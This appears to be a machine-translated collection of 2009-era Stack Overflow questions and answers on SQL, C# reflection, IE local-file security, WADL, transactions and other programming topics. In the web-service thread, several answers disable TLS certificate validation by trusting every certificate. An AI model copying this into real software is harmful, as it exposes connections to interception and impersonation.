> 时间：2009-08-03T08:55:00.020

```
INSERT INTO table_name(column1, column2) SELECT "value one", "value two" FROM DUAL
WHERE NOT EXISTS(
    SELECT column1 FROM table_name
    WHERE column1 = "value one"
    AND column2 = "value two" LIMIT 1
) 
```

# python - 什么是用 Python 实现的好的双向加密库？

> ID：721436
> 
> 赞同：5
> 
> 时间：2009-04-06T13:27:18.333
> 
> 标签：python, encryption

我们现在使用的应用程序的身份验证系统使用双向哈希，基本上只是一个美化的凯撒密码。在不详细介绍它发生了什么的情况下，我想用更安全的加密算法替换它（并且需要在服务器端完成）。不幸的是，它必须是双向的，而 hashlib 中的算法都是单向的。

有哪些好的加密库会包含此类算法？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2009-04-06T13:32:06.760

我假设您想要一个加密算法，而不是哈希。[PyCrypto](https://pypi.python.org/pypi/pycrypto)库提供了相当广泛的选项。它正在转移到一个[新的维护者](http://www.dlitz.net/software/pycrypto/)那里，所以文档有点杂乱无章，但这[大致](http://www.dlitz.net/software/pycrypto/doc/#crypto-cipher-encryption-algorithms)是你想要开始寻找的地方。我通常使用 AES 来处理这样的事情。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-06T13:30:05.797

如果它是双向的，它就不是真正的“哈希”。它是加密（从事物的声音来看，这实际上更像是一种“盐”或“密码”，*而不是真正的加密。）根据**定义*，哈希是单向的。因此，您需要寻找更像 PGP 的东西，而不是像 MD5 或 SHA1 这样的东西。

其次，您能解释一下 2-way 要求背后的原因吗？这通常不再被认为是身份验证系统的良好做法。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-04-06T13:32:16.090

[PyCrypto](http://www.dlitz.net/software/pycrypto/)支持 AES、DES、IDEA、RSA、ElGamal 等。

我在[这里](http://www.dlitz.net/software/pycrypto/doc/)找到了文档。

# mvvm - MVVM + Datacontext + DataTemplate + Blend = problems

> ID：721440
> 
> 赞同：1
> 
> 时间：2009-04-06T13:29:36.080
> 
> 标签：mvvm, datatemplate, datacontext, blend

I'm currently using MVVM in a WPF project, all works very well. I have one Master view and many Detail views that I manage using a currentView property in my MasterViewModel. By using a datatemplate, I bind a view to a viewmodel. In fact, my master view has a contentcontrol whose content property is binded to my CurrentView property. When I set this currentview property to a viewmodel or another, it calls the corresponding template.

My problem is that using this, my detail views doesn't have explicit datacontext because it is placed by my datatemplate. So in blend, when I open my view to edit its design, I have no datas to bind to my view. If I set a datacontext to my detailview, in blend I can see all datas I can bind but in runtime, the datacontext set by datatemplate is overrided by the datacontext set in my detailview, so I have no datas during runtime.

Does anyone knows how I can create a good MVVM project, with views managed by datatemplates and with datacontext that we can see with Blend ?

Thanks,

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-10-05T13:45:24.570

我有一篇关于这个问题的博客文章：[http ://www.robfe.com/2009/08/design-time-data-in-expression-blend-3/](http://www.robfe.com/2009/08/design-time-data-in-expression-blend-3/)

我的帖子都是关于在混合中显示数据，*而*不必在运行时显示甚至创建该数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-05T13:32:25.773

我在这篇文章中解决了一个类似的问题： [如何使用 Expression Blend 编辑在 Visual Studio 中创建的 DataTemplate？](https://stackoverflow.com/questions/824539/how-can-i-use-expression-blend-to-edit-a-datatemplate-created-in-visual-studio)

# c# - c# - 如何遍历类字段并设置属性

> ID：721441
> 
> 赞同：52
> 
> 时间：2009-04-06T13:29:43.380
> 
> 标签：c#, class, properties, set, field

我不确定这是否可行，但我想遍历一个类并设置一个字段成员属性，而不明确引用字段对象：

```
public class Employee
{
  public Person _person = new Person();

  public void DynamicallySetPersonProperty()
  {
    MemberInfo[] members = this.GetType().GetMembers();

    foreach (MemberInfo member in members.Where(a => a.Name == "_person"))
    //get the _person field
    {

      Type type = member.GetType();
      PropertyInfo prop = type.GetProperty("Name"); //good, this works, now to set a value for it

      //this line does not work - the error is "property set method not found"
      prop.SetValue(member, "new name", null);
    }
  }
}

public class Person
{
  public string Name { get; set; }
} 
```

在我标记为您需要添加的答案的答案中：

```
 public static bool IsNullOrEmpty(this string source)
  {
    return (source == null || source.Length > 0) ? true : false;
  } 
```

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2009-04-06T14:20:10.840

这是一个完整的工作示例：

```
public class Person
{
    public string Name { get; set; }
}

class Program
{
    static void PropertySet(object p, string propName, object value)
    {
        Type t = p.GetType();
        PropertyInfo info = t.GetProperty(propName);
        if (info == null)
            return;
        if (!info.CanWrite)
            return;
        info.SetValue(p, value, null);
    }

    static void PropertySetLooping(object p, string propName, object value)
    {
        Type t = p.GetType();
        foreach (PropertyInfo info in t.GetProperties())
        {
            if (info.Name == propName && info.CanWrite)
            {
                info.SetValue(p, value, null);
            }
        }
    }

    static void Main(string[] args)
    {
        Person p = new Person();

        PropertySet(p, "Name", "Michael Ellis");
        Console.WriteLine(p.Name);
        PropertySetLooping(p, "Name", "Nigel Mellish");
        Console.WriteLine(p.Name);
    }
} 
```

编辑：添加了一个循环变体，这样您就可以看到如何循环遍历属性信息对象。

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2009-04-06T14:03:52.330

```
public class Person
{
    public string Name { get; set; }
}

public class Employee
{
    public Person person = new Person();

    public void DynamicallySetPersonProperty()
    {
        var p = GetType().GetField("person").GetValue(this);
        p.GetType().GetProperty("Name").SetValue(p, "new name", null);
    }
} 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-04-06T14:40:35.830

使用我创建的以下扩展方法，您可以设置或获取任何属性值，即使它们是嵌套的

GetPropertyValue(customObject, "Property.Nested.Child.Name");

或设置

SetPropertyValue(customObject, "Property.Nested.Child.Name", "我的自定义名称");

```
 private class TargetProperty
    {
        public object Target { get; set; }
        public PropertyInfo Property { get; set; }

        public bool IsValid { get { return Target != null && Property != null; } }
    }

    private static TargetProperty GetTargetProperty(object source, string propertyName)
    {
        if (!propertyName.Contains("."))
            return new TargetProperty { Target = source, Property = source.GetType().GetProperty(propertyName) };

        string[] propertyPath = propertyName.Split('.');

        var targetProperty = new TargetProperty();

        targetProperty.Target = source;
        targetProperty.Property = source.GetType().GetProperty(propertyPath[0]);

        for (int propertyIndex = 1; propertyIndex < propertyPath.Length; propertyIndex++)
        {
            propertyName = propertyPath[propertyIndex];
            if (!string.IsNullOrEmpty(propertyName))
            {
                targetProperty.Target = targetProperty.Property.GetValue(targetProperty.Target, null);
                targetProperty.Property = targetProperty.Target.GetType().GetProperty(propertyName);
            }
        }

        return targetProperty;
    }

    public static bool HasProperty(this object source, string propertyName)
    {
        return GetTargetProperty(source, propertyName).Property != null;
    }

    public static object GetPropertyValue(this object source, string propertyName)
    {
        var targetProperty = GetTargetProperty(source, propertyName);
        if (targetProperty.IsValid)
        {
            return targetProperty.Property.GetValue(targetProperty.Target, null);
        }
        return null;
    }

    public static void SetPropertyValue(this object source, string propertyName, object value)
    {
        var targetProperty = GetTargetProperty(source, propertyName);
        if(targetProperty.IsValid)
        {
            targetProperty.Property.SetValue(targetProperty.Target, value, null);
        }
    } 
```

这里有几个测试

```
 [TestFixture]
public class ObjectExtensionsTest
{

    private class MockClass
    {
        public MockClass()
        {
            Nested = new NestedMockClass();
        }

        public string Id { get; set; }
        public string Name { get; set; }

        public string GetOnly { get { return "MockClass"; } }
        public string SetOnly { set { } }

        public NestedMockClass Nested { get; set; }
    }

    private class NestedMockClass
    {
        public string NestedId { get; set; }
        public string NestedName { get; set; }

        public string NestedGetOnly { get { return "NestedMockClass"; } }
        public string NestedSetOnly { set { } }
    }

    [Test]
    public void TestShouldFindProperty()
    {
        MockClass mockObject = new MockClass();

        Assert.IsTrue(mockObject.HasProperty("Id"));
        Assert.IsTrue(mockObject.HasProperty("Name"));
        Assert.IsTrue(mockObject.HasProperty("GetOnly"));
        Assert.IsTrue(mockObject.HasProperty("SetOnly"));
        Assert.IsTrue(mockObject.HasProperty("Nested"));
        Assert.IsTrue(mockObject.HasProperty("Nested.NestedId"));
        Assert.IsTrue(mockObject.HasProperty("Nested.NestedName"));
        Assert.IsTrue(mockObject.HasProperty("Nested.NestedGetOnly"));
        Assert.IsTrue(mockObject.HasProperty("Nested.NestedSetOnly"));
    }

    [Test]
    public void TestShouldGetPropertyValue()
    {
        MockClass mockObject = new MockClass();

        mockObject.Id = "1";
        mockObject.Name = "Name";
        mockObject.Nested.NestedId = "NestedId";
        mockObject.Nested.NestedName = "NestedName";

        Assert.AreEqual(mockObject.Id, mockObject.GetPropertyValue("Id"));
        Assert.AreEqual(mockObject.Name, mockObject.GetPropertyValue("Name"));
        Assert.AreEqual(mockObject.GetOnly, mockObject.GetPropertyValue("GetOnly"));
        Assert.AreEqual(mockObject.Nested.NestedId, mockObject.GetPropertyValue("Nested.NestedId"));
        Assert.AreEqual(mockObject.Nested.NestedName, mockObject.GetPropertyValue("Nested.NestedName"));

    }

    [Test]
    public void TestShouldSetPropertyValue()
    {
        MockClass mockObject = new MockClass();

        mockObject.SetPropertyValue("Id", "1");
        mockObject.SetPropertyValue("Name", "Name");
        mockObject.SetPropertyValue("Nested.NestedId", "NestedId");
        mockObject.SetPropertyValue("Nested.NestedName", "NestedName");

        Assert.AreEqual(mockObject.Id, "1");
        Assert.AreEqual(mockObject.Name, "Name");
        Assert.AreEqual(mockObject.Nested.NestedId, "NestedId");
        Assert.AreEqual(mockObject.Nested.NestedName, "NestedName");

    }
} 
```

希望你觉得它有用。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-04-06T13:35:24.507

您正在尝试设置 Employee 类的 _person 字段的 Name 属性。它没有一个。试试这个：

```
prop.SetValue(((FieldInfo)member).GetValue(this), "new name", null) 
```

不确定您是否需要像这样转换第一个参数：

```
prop.SetValue((Person)((FieldInfo)member).GetValue(this), "new name", null) 
```

然后将其应用于 _person 字段的值。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-04-06T13:43:32.177

您尝试对MemberInfo 对象的变量`SetValue()`属性执行操作，并且此属性是只读的。`Name``member`

请注意，您不需要遍历所有成员，也不需要`_person`使用反射获取字段，因为它与方法在同一个类中定义`DynamicallySetPersonProperty()`。

所以代码应该是这样的。

```
PropertyInfo property = this._person.GetType().GetProperty("Name");

property.SetValue(this._person, "new name", null); 
```

`_person`如果为空，第一行将失败。所以你可以使用reflectionn来获取字段的类型。

```
FieldInfo field = this.GetType().GetField("_person", BindingFlags.Public);

PropertyInfo property = field.FieldType.GetProperty("Name"); 
```

`_person`但是现在如果为空，访问这个属性仍然会失败。

```
property.Setvalue(field.GetValue(this), "new name", null); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-07-24T18:30:34.097

试试这个：

```
public static void ApplyPropertyChanges(this object objDest, object objToCopyFrom)
    {
        if (objDest == null)
            throw new ArgumentNullException();
        if (objToCopyFrom == null)
            throw new ArgumentNullException("objToCopyFrom");
        if (objDest.GetType() != objToCopyFrom.GetType())
            throw new Exception("Invalid type. Required: \"" + objDest.GetType().ToString() + "\"");

        foreach (System.Reflection.PropertyInfo piOrig in objDest.GetType().GetProperties())
        {
            object editedVal = objToCopyFrom.GetType().GetProperty(piOrig.Name).GetValue(objToCopyFrom, null);

            piOrig.SetValue(objDest,
            editedVal,
            null);
        }
    } 
```

用法示例：

```
 public ActionResult Edit(Team editedTeamData)
    {
        if (!ModelState.IsValid)
            return View();

        Team origTeam = (from t in _db.Teams
                         where t.TeamID == editedTeamData.TeamID
                         select t).FirstOrDefault();

        origTeam.ApplyPropertyChanges(editedTeamData);
        _db.SubmitChanges();

        return RedirectToAction("Index");

    } 
```

# javascript - 如何告诉 IE 我磁盘上的 HTML 文件没有安全风险？

> ID：721446
> 
> 赞同：11
> 
> 时间：2009-04-06T13:30:31.273
> 
> 标签：javascript, security, internet-explorer

我们的构建脚本使用一些嵌入的 javascript 创建一个 HTML 日志。当我在 Internet Explorer 中打开它时，我看到 IE 已阻止运行“脚本或 activex 控件”的黄色警告栏。

由于它是一个本地文件，我无法将它添加到受信任的站点（IE 在这里需要一个域）。

我不想更改默认区域的安全设置。

知道如何永久解锁它吗？

XP Pro 上的 IE 版本为 7.0.5730.13。

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-04-06T13:47:53.523

嵌入[网络标记](http://msdn.microsoft.com/en-us/library/ms537628.aspx)：

```
<!-- saved from url=(0016)http://localhost --> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T13:50:52.317

您可以将[Web 的标记](http://msdn.microsoft.com/en-us/library/ms537628(VS.85).aspx)添加到文档中，这样 IE 就好像它来自某个安全区域一样。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T13:34:11.357

可能不是你想听到的，但我不确定你能不能。当您在其中任何一个中运行 Firefox/Opera/Safari 时会抱怨吗？如果它有效，那么这对我来说似乎是最简单的解决方案。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T13:50:09.667

您可以添加本地计算机区域并为其配置安全性：

[http://www.microsoft.com/windows/IE/community/columns/improvements.mspx](http://www.microsoft.com/windows/IE/community/columns/improvements.mspx)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-02-24T06:04:35.023

您始终可以启用**ActiveX**。我已经在 Internet Explorer 11 上对此进行了测试，但应该适用于早期版本的 IE：

**工具 > Internet 选项 > 高级 > 安全**：

```
(✓) Allow active content from CDs to run on My Computer
(✓) Allow active content to run in files on My Computer 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T13:47:46.613

您可以设置本地服务器并将此类文件保存在您现在可以添加到受信任站点的域中，但是在 IE 之外的任何其他浏览器中打开文件都更容易。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T14:04:01.550

另一种选择，如果它只是 IE 您需要查看它是将其保存为 .hta 文件。

这使它成为一个 HTML 应用程序。

就像将后缀更改为 .hta 一样简单。尽管您可以指定其他选项。

欲了解更多信息：

[http://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx](http://msdn.microsoft.com/en-us/library/ms536496(VS.85).aspx)

# c# - Visual Studio 2008 - 控件的修饰符属性在哪里？

> ID：721462
> 
> 赞同：0
> 
> 时间：2009-04-06T13:32:51.127
> 
> 标签：c#, visual-studio, visual-studio-2008

我需要在我的用户控件中将控件的范围从朋友更改为公共 - 控件的修饰符属性发生了什么？我在属性表中没有看到它。我现在应该如何更改控件的范围（除了进入设计器文件并在自动生成的代码中更改它）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T13:35:55.473

最好的选择是创建一个公共属性来公开控件或控件自身属性的子集。

希望这可以帮助...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T13:35:35.597

我刚刚使用 WinForms 和 C# 验证了修改器行仍然存在于 VS2008 中的设计组下。我正在运行 VS2008 SP1。

您是否尝试过切换到字母模式并查看它是否列在那里？您使用的是哪个控件（我尝试了 Button）

# wadl - 在哪里可以找到完整的 WADL 规范？

> ID：721465
> 
> 赞同：2
> 
> 时间：2009-04-06T13:33:35.040
> 
> 标签：wadl

我读过一个很好的 WADL 文件[示例](http://www.mnot.net/webdesc/)。我还检查了[WADL2Java](https://wadl.dev.java.net/wadl2java.html)工具。

但我似乎找不到 WADL 格式的完整规范。我有许多悬而未决的问题，主要是处理文件的各个部分如何相互关联，以及我是否可以通过使用引用来减少重复。

**之后**

[leppie](https://stackoverflow.com/questions/721465/where-can-i-find-a-full-wadl-spec/721489#721489)得到了官方的回答，但是那个文件有点糟糕。谁有更好的参考？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2010-12-22T12:03:37.250

> [leppie](https://stackoverflow.com/questions/721465/where-can-i-find-a-full-wadl-spec/721489#721489)得到了官方的回答，但是那个文件有点糟糕。谁有更好的参考？

[同时， Web 应用程序描述语言 (WADL)](http://www.w3.org/Submission/wadl/)的更新规范已作为*W3C 成员提交，其质量也相应显着提高（尽管仍无法与官方**W3C 推荐*标准相提并论）；请参阅[WADL 现在是 W3C 成员提交](http://java.net/projects/wadl/lists/dev/archive/2009-10/message/0)的声明，由 Marc Hadley 发布，他是这两个版本的作者。

请注意，自 2006 年 11 月发布以来有一些[更改](http://www.w3.org/Submission/wadl/#x3-41000D.1)，您可以在 Marc Hadleys 博客文章[WADL 更新草案](http://weblogs.java.net/blog/2009/02/03/draft-wadl-update)中找到有关这些更改的更多信息。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-01-10T10:51:27.227

[http://www.w3.org/Submission/wadl/](http://www.w3.org/Submission/wadl/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-06-26T19:08:37.870

嗯，只有 2006 年的规范的 PDF。Hadley 提交了一份 W3C 提交，也可以在 @leppie 链接到的页面上找到。[这](http://www.w3.org/Submission/wadl/)是一个直接链接。自 2006 年以来发生了一些变化，例如现在允许超过一名`<resources>`儿童进入`<application>`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:39:38.210

这不是吗[？](https://wadl.dev.java.net/#spec)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-07-29T18:58:04.753

以下是 XSD 供参考：[http ://code.w3.org/unicorn/browser/WebContent/WEB-INF/resources/schemas/wadl.xsd](http://code.w3.org/unicorn/browser/WebContent/WEB-INF/resources/schemas/wadl.xsd)

# html - 从独立的 html 文件发布到远程 url

> ID：721469
> 
> 赞同：0
> 
> 时间：2009-04-06T13:34:00.517
> 
> 标签：html, forms

我正在尝试从桌面上的本地 html 文件发布到远程 url，但服务器似乎没有收到任何发布数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:49:39.963

哎呀，设计师没有保留表单输入名称属性......（我只是假设他们做到了）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T13:37:58.370

将操作设置为任何网址的表单标签将发送给它：

```
<form method="post" action="http://example.com/myscript.php"> 
```

再次查看您的代码以确保您没有忘记任何内容。向我们展示 HTML 可能有助于回答问题。

# sql - 如何在 SQL Server 2005 中回滚 UPDATE 查询？

> ID：721471
> 
> 赞同：21
> 
> 时间：2009-04-06T13:34:16.130
> 
> 标签：sql, sql-server-2005, sql-update, rollback

如何在 SQL Server 2005 中回滚 UPDATE 查询？

我需要在 SQL 中执行此操作，而不是通过代码。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2009-04-06T13:38:46.480

```
begin transaction

// execute SQL code here

rollback transaction 
```

如果您已经执行了查询并想要回滚它，那么不幸的是，您唯一真正的选择是恢复数据库备份。如果您使用的是完整备份，那么您应该能够将数据库恢复到特定的时间点。

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2009-04-06T13:46:52.450

你需要这个工具，你可以找到交易并撤销它。

[ApexSQL 日志](http://www.apexsql.com/sql_tools_log.asp?gclid=COWEvOex3JkCFQMQswod4RgXXA)

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-01-30T07:49:33.820

您可以为此使用**隐式事务**

```
SET IMPLICIT_TRANSACTIONS ON

update Staff set staff_Name='jas' where staff_id=7

ROLLBACK 
```

根据您的要求 - 您可以`SET IMPLICIT_TRANSACTIONS ON`通过将该存储过程设置为启动过程来从存储过程中设置此设置 ( )。

但是`SET IMPLICIT TRANSACTION ON`命令是特定于连接的。因此，除了运行启动存储过程的连接之外的任何连接都不会从您设置的设置中受益。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-04-06T13:38:37.773

您可以回滚您在事务中执行的语句。与其提交事务，不如回滚事务。

如果您更新了某些内容并想要回滚这些更新，并且您还没有在（尚未提交的）事务中完成此操作，那么我认为这是运气......

（手动修复或恢复备份）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T13:40:29.580

提交更新后，您不能只回滚单个更新。最好的办法是回滚到数据库的先前备份。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-06T13:41:05.617

根据您指定的信息，您最好的恢复机会是通过数据库备份。我认为您将无法回滚您推动的任何更改，因为您当时显然没有使用事务。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-01-09T17:53:59.930

做起来很简单：

标题代码...

```
Set objMyConn = New ADODB.Connection

Set objMyCmd = New ADODB.Command Set

objMyRecordset = New ADODB.Recordset

On Error GoTo ERRORHAND 
```

工作代码...

```
objMyConn.ConnectionString = ConnStr

objMyConn.Open 
```

代码....

'从 Excel 复制数据'

```
objMyConn.BeginTrans <-- define transactions to possible be rolled back 

For NewRows = 2 To Rows

objMyRecordset.AddNew 

For NewColumns = 0 To Columns - 1

objMyRecordset.Fields(NewColumns).Value = ActiveSheet.Cells(NewRows, NewColumns + 1)

Next NewColumns objMyRecordset.Update Next NewRows

objMyConn.CommitTrans <- if success, commit them to DB

objMyConn.Close 
```

误手：

```
Success = False 

objMyConn.RollbackTrans <-- here we roll back if error encountered somewhere

LogMessage = "ERROR writing database: " & Err.Description 
```

...

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-06T13:50:19.477

如前所述，除了从备份恢复之外，您无能为力。至少现在您将学会始终将语句包装在事务中，以查看在您决定提交之前会发生什么。此外，如果您没有数据库备份，这也将教您定期备份数据库。

虽然我们对您的直接问题没有太大帮助......但希望这些答案将确保您将来不会再次遇到这个问题。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2018-01-04T11:53:27.207

在此示例中，我们在查询中运行 2 行插入，如果它们全部为真，则运行，但如果不是，则运行任何内容并回滚

```
DECLARE @rowcount int  set @rowcount = 0 ; 
BEGIN TRANSACTION [Tran1]
BEGIN TRY 
 insert into [database].[dbo].[tbl1] (fld1) values('1') ;
    set @rowcount = (@rowcount + @@ROWCOUNT); 
 insert into [database].[dbo].[tbl2] (fld1) values('2') ;
    set @rowcount = (@rowcount + @@ROWCOUNT); 

IF @rowcount =  2
  COMMIT TRANSACTION[Tran1]
ELSE
  ROLLBACK TRANSACTION[Tran1]
END TRY
  BEGIN CATCH
  ROLLBACK TRANSACTION[Tran1]
END CATCH 
```

* * *

## 回答 #10

> 赞同：-3
> 
> 时间：2012-07-31T02:20:30.610

尝试

```
ROLLBACK WORK; 
```

它通常有效

# vb.net - .net WebService，绕过 ssl 验证！

> ID：721472
> 
> 赞同：5
> 
> 时间：2009-04-06T13:34:57.050
> 
> 标签：vb.net, web-services, ssl

好吧，我正在再次使用具有不是 100% 正确设置证书的 Web 服务，该证书是为域 *.domain1.com 设置的，并且 api 位于soap.shop.domain1.com/SOAP 现在我无法连接到这个webservice，然后我得到一个 WebException“无法为 SSL/TLS 安全通道建立 trush 关系。--> 根据验证过程，远程证书无效。

现在我的问题是有什么方法可以绕过这个检查我使用普通的 Web 参考（2.0）而不是服务参考..

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-05-25T15:42:29.117

对于那些无法确定从哪里开始回答的人来说，这可能并不明显。上面的海报是正确的，但是对于如何处理给定的代码并不清楚。

假设您有一个类需要调用带有证书的 Web 服务。

这是我完成的解决方案：

```
public class MyClass
{

    public  bool TrustAllCertificatesCallback(object sender, X509Certificate cert,
                                                X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }

    public string CallSomeWebService(string someParam)
    {
        try
        { 
            ServicePointManager.ServerCertificateValidationCallback = TrustAllCertificatesCallback;

            RemoteWebService ws = new RemoteWebService();

            //add the client cert to the web service call.
            ws.ClientCertificates.Add(GetMyCert());

            //call the web service
            string response = ws.SomeMethod(someParam);

            return response.ToString();
        }
        catch (Exception ex)
        {throw;}
    }

    public X509Certificate GetMyCert()
    {
        try
        {
            string certPath = @"C:\MyCerts\MyCert.cer";
            var cert = X509Certificate.CreateFromCertFile(certPath);
            return cert;
        }
        catch (Exception ex)
        {throw;}
    }
} 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-04-06T13:47:22.417

是的，您可以使用以下方法让 ASP.NET 忽略证书警告：

```
using System;
using System.Net;
using System.Security.Cryptography.X509Certificates;

namespace YourNamespace
    public class TrustAllCertificatePolicy : System.Net.ICertificatePolicy
    {
        public TrustAllCertificatePolicy() {}

        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,WebRequest req, int problem)
        {
            return true;
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T13:49:05.067

```
System.Net.ServicePointManager.ServerCertificateValidationCallback = _
   Function(a, b, c, d) True 
```

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2011-07-07T15:46:07.807

选你的口味。。

λ 表达式

```
 //Trust all certificates
            System.Net.ServicePointManager.ServerCertificateValidationCallback =
                ((sender, certificate, chain, sslPolicyErrors) => true);

            // trust sender (more secure)
            System.Net.ServicePointManager.ServerCertificateValidationCallback
                = ((sender, cert, chain, errors) => cert.Subject.Contains("YourServerName")); 
```

或plain clode（更适​​合测试）

```
 // validate cert
            // allows for validation of SSL conversations
            ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(ValidateRemoteCertificate);

    // callback used to validate the certificate in an SSL conversation
    private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors policyErrors)
    {
        bool result = false;
        if (cert.Subject.ToUpper().Contains("YourServerName"))
        {
            result = true;
        }

        return result;
    } 
```

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T13:46:06.773

您需要处理验证证书的事件并将其设置为始终返回 true。有关详细信息，请参阅以下帖子：

[http://8r13n.wordpress.com/2007/07/24/bypassing-certificate-validation-in-net/](http://8r13n.wordpress.com/2007/07/24/bypassing-certificate-validation-in-net/)

# windows - 需要印度历

> ID：721479
> 
> 赞同：0
> 
> 时间：2009-04-06T13:36:02.180
> 
> 标签：windows

我想要一个 100 年的日历，显示某些印度特殊日子，如 Amavasya 和 Poornima。

例如，我想找到Poornima 或Amavasya 的日子——1936 年。Shivratri aur janmasthami 是什么时候。我想根据这些规格找到一天。

如果有可以做到这一点的程序，请告诉我。

谢谢你。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T13:48:46.267

amavasya 和 Poornima（新月和满月）是根据下面[wiki](http://en.wikipedia.org/wiki/Full_moon)中定义的复杂公式计算的。你可以尝试开发一个小程序。:-)

# javascript - 我们可以一键打印单独的html页面吗

> ID：721483
> 
> 赞同：1
> 
> 时间：2009-04-06T13:37:51.520
> 
> 标签：javascript

我们可以一键打印单独的html页面吗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T13:42:23.117

尝试为打印模式使用特定的 CSS。

```
<link rel="stylesheet" type="text/css" media="print" href="print.css"> 
```

来源：[http ://www.javascriptkit.com/dhtmltutors/cssmedia.shtml](http://www.javascriptkit.com/dhtmltutors/cssmedia.shtml)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T13:40:29.597

不。

但是您可以创建一个新页面，其中包含您要打印的每个页面的内容，可能使用媒体选择器仅在屏幕上显示摘要），然后单击*两次*即可打印该页面（单击打开打印对话框，另一次单击打开打印对话框）单击“确定”）。

[更新]：当我想得更多时，您可能可以使用 javascript 将页面加载为弹出窗口，然后为每个加载的页面打开打印对话框。不过，这对用户来说不会是一个非常好的体验。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:43:29.167

我知道 Internet Explorer 在打印选项中可以选择打印此页面以及所有链接页面。您可以创建指向您想要的所有页面的单页链接，然后在打开该设置的情况下打印该链接。

[![](https://i.stack.imgur.com/qZyOZ.jpg)](https://i.stack.imgur.com/qZyOZ.jpg)
[（来源：[tas.gov.au](http://wwwfp.education.tas.gov.au/infostream/printing/images/printdialog.jpg)）]

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:47:16.520

我认为这是可能的，但不确定可移植性。我正在开发一个丰富的 Intranet 应用程序，它可以在 Internet Explorer 下运行（因此我不知道它的可移植性）并使用了这样的函数：

```
printHtml = function(html){
  var frame = top.document.getElementById(IFRAME_ID);
  if (!frame) {
    frame = top.document.createElement('IFRAME');
    frame.id = IFRAME_ID;
    frame.style.width = '1px';
    frame.style.height = '1px';
    top.document.body.appendChild(frame);

    frame.contentWindow.document.open();
    frame.contentWindow.document.write('<html><head>');
    frame.contentWindow.document.write('<link type="text/css" rel="StyleSheet" media="all" href="style.css"/>');
    frame.contentWindow.document.write(
        '</head><body onload="window.focus();window.print();top.document.body.removeChild(top.document.getElementById(\''
            + IFRAME_ID + '\'));">');
    frame.contentWindow.document.write(html);
    frame.contentWindow.document.write('</body></html>');
    frame.contentWindow.document.close();
  }
}; 
```

我想，您可以创建 iframe 并打印它们任意次数，尽管每个页面都会显示打印选项对话框。

# sql - SQL Server 中数据库范围内唯一但简单的标识符

> ID：721497
> 
> 赞同：47
> 
> 时间：2009-04-06T13:41:13.617
> 
> 标签：sql, sql-server, database, database-design, identity

首先，我知道[这个问题](https://stackoverflow.com/questions/479308/sql-server-globally-unique-identifiers)，并且建议（使用 GUID）不适用于我的情况。

我想要简单的 UID，以便我的用户可以轻松地通过电话传达此信息：

> 您好，我的订单 1584 有问题

与

> 您好，我的订单 4daz33-d4gerz384867-8234878-14 有问题

我希望它们是唯一的（数据库范围内的），因为我有几种不同类型的“对象”……有订单 ID、交货 ID 和计费 ID，因为它们之间没有一对一的关系，我无法猜测 ID 指的是哪种对象。

使用数据库范围的唯一 ID，我可以立即分辨出我的客户所指的对象。我的用户只需在搜索工具中输入一个 ID，我就可以为他节省额外的点击以进一步细化正在查找的内容。

我目前的想法是使用具有不同种子 1、2、3 等的标识列，增量值为 100。

这提出了几个问题：

*   如果我最终得到超过 100 个对象类型怎么办？授予我可以使用 1000 或 10000，但是不能很好扩展的东西“闻起来”

*   种子是否有可能“丢失”（在复制、数据库问题等期间？）

*   更一般地说，还有其他我应该注意的问题吗？

